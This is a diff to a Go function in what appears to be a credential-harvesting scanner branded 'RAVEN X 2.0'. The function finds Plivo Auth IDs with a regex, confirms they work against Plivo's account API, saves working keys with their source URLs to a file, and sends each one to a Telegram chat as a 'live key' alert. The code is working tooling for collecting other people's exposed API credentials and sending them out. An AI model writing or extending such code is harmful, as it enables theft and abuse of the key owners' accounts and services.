@@ -1,33 +1,73 @@
 package main
 
 import (
+	"context"
+	"encoding/json"
+	"fmt"
 	"net/http"
 	"regexp"
+	"time"
 )
 
-// Plivo uses an Auth ID (20-char alphanumeric, starts with MA or SA) and
-// an Auth Token (40-char alphanumeric). The pattern matches the Auth ID
-// (the Twilio-equivalent of an Account SID). Validation uses Basic auth
-// against the /Account/<AuthID>/ endpoint.
 var plivoPattern = regexp.MustCompile(`(?i)(?:plivo[_-]?(?:auth[_-]?)?(?:id|sid))["'\s:=]+([MS]A[A-Z0-9]{18})`)
 
-// CheckPlivo validates a Plivo Auth ID by hitting the account endpoint
-// with Basic auth (id:token). Without a paired token we use id:id which
-// 401s deterministically — only 200 confirms a real authenticated key.
-// Uses do429Retry for rate-limit resilience.
 func (a *AWSScanner) CheckPlivo(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Plivo {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+
 	url := "https://api.plivo.com/v1/Account/" + key + "/"
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return false
 	}
-	req.SetBasicAuth(key, key) // best-effort without paired token
+	req.SetBasicAuth(key, key)
 	req.Header.Set("Accept", "application/json")
 
-	resp, err := do429Retry(httpClient, req, 3)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	req = req.WithContext(ctx)
+
+	resp, err := do429Retry(client, req, 3)
 	if err != nil || resp == nil {
 		return false
 	}
 	defer resp.Body.Close()
-	return resp.StatusCode == 200
+
+	if resp.StatusCode != 200 {
+		return false
+	}
+
+	var res struct {
+		Name       string `json:"name"`
+		AutoRecharge bool `json:"auto_recharge"`
+	}
+	json.NewDecoder(resp.Body).Decode(&res)
+	info := res.Name
+
+	a.logValid("Plivo", fmt.Sprintf("AuthID: %s | Name: %s", key, info))
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_plivo.txt")
+	a.storeValidKeyLimit("Plivo", key, info)
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsValidated++
+	globalCounters.mu.Unlock()
+
+	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📞 <b>PLIVO LIVE KEY</b>
+
+🔑 <b>Auth ID:</b> <code>%s</code>
+👤 <b>Account:</b> %s
+🔗 <b>Source:</b> %s
+`, key, info, sourceURL)
+	go a.sendTelegram(msg)
+	return true
 }
